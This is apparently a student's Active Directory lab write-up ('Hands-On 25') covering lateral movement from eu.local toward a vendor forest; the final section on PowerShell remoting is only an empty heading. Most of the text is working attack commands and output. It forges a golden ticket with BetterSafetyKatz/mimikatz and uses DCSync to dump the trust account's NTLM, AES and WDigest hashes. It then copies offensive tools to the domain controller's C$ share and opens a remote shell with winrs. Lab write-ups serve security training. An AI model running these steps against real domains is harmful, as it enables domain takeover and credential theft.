# Hands-On 25:

```
Using the DA access to eu.local:
− Access eushare on euvendor-dc.
− Access euvendor-net using PowerShell Remoting.
```

## Index Of COntent

  1. [Using DA accss to eu local](#using-da-access-to-eu-local)
  2. [Accesss eushare on euvendor dc](#access-eushare-on-euvendor-dc)
  3. [Access euvendor net using powershell remoting](#access-euvendor-net-using-powershell-remoting)

## Using DA accss to eu local

Using a Golden Ticket technique in order to gain access to eu.local, with BetterSafetykatz, the SID and the aes256 hash are from krbtgt user dumped on the hands-on 23:
```
C:\Windows\system32>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /ptt
User      : Administrator
Domain    : eu.local (EU)
SID       : S-1-5-21-3657428294-2017276338-1274645009
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d - aes256_hmac
Lifetime  : 3/3/2023 11:37:46 AM ; 2/28/2033 11:37:46 AM ; 2/28/2033 11:37:46 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ eu.local' successfully submitted for current session

```
Dump lda process from euvendor machine:
```
mimikatz # lsadump::dcsync /user:eu\euvendor$ /domain:eu.local
[DC] 'eu.local' will be the domain
[DC] 'EU-DC.eu.local' will be the DC server
[DC] 'eu\euvendor$' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : EUVENDOR$

** SAM ACCOUNT **

SAM Username         : EUVENDOR$
Account Type         : 30000002 ( TRUST_ACCOUNT )
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Account expiration   :
Password last change : 3/2/2023 8:03:08 PM
Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-1107
Object Relative ID   : 1107

Credentials:
  Hash NTLM: 464f502f11ac9d3467ca8b262641ad81
    ntlm- 0: 464f502f11ac9d3467ca8b262641ad81
    ntlm- 1: 1fe7ba25b640f278725598e76f8f89b9
    ntlm- 2: 1fe7ba25b640f278725598e76f8f89b9
    ntlm- 3: 1fe7ba25b640f278725598e76f8f89b9
    ntlm- 4: cb08a40c6f30fe424b35ec5eeb6d2521
    ntlm- 5: cb08a40c6f30fe424b35ec5eeb6d2521
    ntlm- 6: 2588ced1a175a36e903bd0e3fc9a3dea
    ntlm- 7: 889b3562e5f5d9b8510226d5bcc48e11
    ntlm- 8: 889b3562e5f5d9b8510226d5bcc48e11
    ntlm- 9: cb4c2372c0b3d0fe73dfebf52a08679c
    ntlm-10: cb4c2372c0b3d0fe73dfebf52a08679c
    ntlm-11: cb4c2372c0b3d0fe73dfebf52a08679c
    ntlm-12: 03a53f7d2a322bf8b7facee24239df1b
    ntlm-13: 9d92a486171fa1af31b8de0ea71408b2
    ntlm-14: 9d92a486171fa1af31b8de0ea71408b2
    ntlm-15: 5085344c510c2839d89c4f11addd29cc
    ntlm-16: 5085344c510c2839d89c4f11addd29cc
    ntlm-17: 45490512f85afc14d3383047b9b71517
    ntlm-18: 45490512f85afc14d3383047b9b71517
    ntlm-19: 45490512f85afc14d3383047b9b71517
    ntlm-20: 629b1eaa7ec6cfe2f4943a853ad6b36b
    ntlm-21: 05c042eb6d4c3dd121acaa018f6ad8f1
    ntlm-22: 05c042eb6d4c3dd121acaa018f6ad8f1
    ntlm-23: 5a30adfcea789525d9c817e434009c46
    lm  - 0: c55de1cff294d7c7d48682dc3f1a1ca1
    lm  - 1: 8238c09007bb7d474d8a0f4c96f2a2d6
    lm  - 2: d1097e6ebe9486da499dd84650b6506f
    lm  - 3: 4a4f58b0220cb2fc39f730c01b86f97a
    lm  - 4: cab5fd8f4104800c906b5434c5c2fc75
    lm  - 5: 24bcb4dac522e596cea3a28761d96189
    lm  - 6: 8b7310f8d5531f4c1749a7334e03c478
    lm  - 7: 23eae31091bc943bd29bd210ba9cd838
    lm  - 8: 5fdd04a2ed9500082f71bdf602f88118
    lm  - 9: e8adf6a77175af931fd0fa99fde9d03f
    lm  -10: 969d27c5ad3bb6f54281b63b35d62ba2
    lm  -11: 7e0b2942a1ddba3f972f23aa8107a7dc
    lm  -12: 12d13431465bef576965543faf1f699b
    lm  -13: 979d226f24d5f90ae150857cef0cb232
    lm  -14: f6d240ceb13d76532ccea58b058750cd
    lm  -15: 3e65f0cf59ad354110656aa606c13e7d
    lm  -16: 37ca6691c09562a79cc164f9e4708aa3
    lm  -17: fb2b0edf002d9666cbb5539c22a20641
    lm  -18: b8308091021b4d8a1f0e4c4f26f91e97
    lm  -19: 652e668f36c7be56ceeccbb58f6036ba
    lm  -20: 64109dfdf4e5a6586e18d0da9baa2f47
    lm  -21: d6e5e31cb32a30857b867b44d40a5319
    lm  -22: a2073d0598ed5f8e98ea3f3bfda7f489
    lm  -23: e69547670b8bce3a07fe0f119b7a409a

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : EU.LOCALkrbtgtEUVENDOR
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 36a553d61154d59925d913cda6dc1e844cad972131d88fcdb3248e44358a40d9
      aes128_hmac       (4096) : c633953fa6a329816f468ed76061facc
      des_cbc_md5       (4096) : df43f457453125b3
    OldCredentials
      aes256_hmac       (4096) : 7a17810aca19b4d8291d142b7477dbbc903e87dc3431a9ff5bef138fe4fc97ce
      aes128_hmac       (4096) : cefbd9508aaf89357b0d8aa445cc966c
      des_cbc_md5       (4096) : a86b685d9ba8c264
    OlderCredentials
      aes256_hmac       (4096) : 7a17810aca19b4d8291d142b7477dbbc903e87dc3431a9ff5bef138fe4fc97ce
      aes128_hmac       (4096) : cefbd9508aaf89357b0d8aa445cc966c
      des_cbc_md5       (4096) : a86b685d9ba8c264

* Primary:Kerberos *
    Default Salt : EU.LOCALkrbtgtEUVENDOR
    Credentials
      des_cbc_md5       : df43f457453125b3
    OldCredentials
      des_cbc_md5       : a86b685d9ba8c264

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  dd656c38d14f8a836cf4f9620b22d734
    02  4b680ea44de8b58cba04757c6b235ea1
    03  dd656c38d14f8a836cf4f9620b22d734
    04  dd656c38d14f8a836cf4f9620b22d734
    05  6957acb1ae5d1e03bc0b18122a5c9667
    06  6957acb1ae5d1e03bc0b18122a5c9667
    07  1304f3993ea3aff18445b1f7fe35bfd8
    08  fc5bfdf82f28a9b1e37b313e5f055e8a
    09  a636e19ab19b6e4ad1a0e6496f36e31b
    10  8c64e0d966c402557bdd4ac741b56af0
    11  8c64e0d966c402557bdd4ac741b56af0
    12  fc5bfdf82f28a9b1e37b313e5f055e8a
    13  fc5bfdf82f28a9b1e37b313e5f055e8a
    14  f59b6e15dfa3fea2af8bdfb238b6d881
    15  359ed8adc76e2fc0d2d17507625b2463
    16  bc8fc68b51c0a46dbe98e6297fef2c5d
    17  85a7a4267e93bd2f4b421f7b6c9f3dd9
    18  f056b199d5851ade3cc747fe6c4d84af
    19  10ff0a7433ace516b4e0770d85bdf34f
    20  f056b199d5851ade3cc747fe6c4d84af
    21  21e615da510279346ef92055a43d94c8
    22  a6c57f4715f15728e63bec4c84ce30c0
    23  21e615da510279346ef92055a43d94c8
    24  b24de7e0f4d1415159d122c6e6eaf066
    25  606858125dd3dd20bf52227c8e2f10dd
    26  d810171e8487d7f91b3a4b70cc59fa1f
    27  0a55cb6f46ca17cb5eaffbfb2e4f4c41
    28  0dd4faaa9886d2c859da6f43598eaf07
    29  0a55cb6f46ca17cb5eaffbfb2e4f4c41


```
## Accesss eushare on euvendor dc
Review chaed tickets:
```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (2)

#0>     Client: Administrator @ eu.local
        Server: krbtgt/eu.local @ eu.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/3/2023 11:37:46 (local)
        End Time:   2/28/2033 11:37:46 (local)
        Renew Time: 2/28/2033 11:37:46 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ eu.local
        Server: ldap/EU-DC.eu.local @ EU.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/3/2023 11:37:51 (local)
        End Time:   3/3/2023 21:37:51 (local)
        Renew Time: 3/10/2023 11:37:51 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: EU-DC.eu.local
```
Copy binaries to eu-dc.eu.local:

```
C:\Windows\system32>echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\eu-dc.eu.local\C$\Users\Public\BetterSafetyKatz.exe /Y
Does \\eu-dc.eu.local\C$\Users\Public\BetterSafetyKatz.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\BetterSafetyKatz.exe
1 File(s) copied

C:\Windows\system32>echo F | xcopy C:\AD\Tools\Rubeus.exe \\eu-dc.eu.local\C$\Users\Public\Rubeus.exe /Y
Does \\eu-dc.eu.local\C$\Users\Public\Rubeus.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Rubeus.exe
1 File(s) copied

```
Accesss to eu-dc.eu.local:

```
C:\Windows\system32>winrs -r:eu-dc.eu.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
EU-DC

C:\Users\Administrator>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::f7f9:b2b9:5130:1891%3
   IPv4 Address. . . . . . . . . . . : 192.168.12.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.12.254


```


## Access euvendor net using powershell remoting
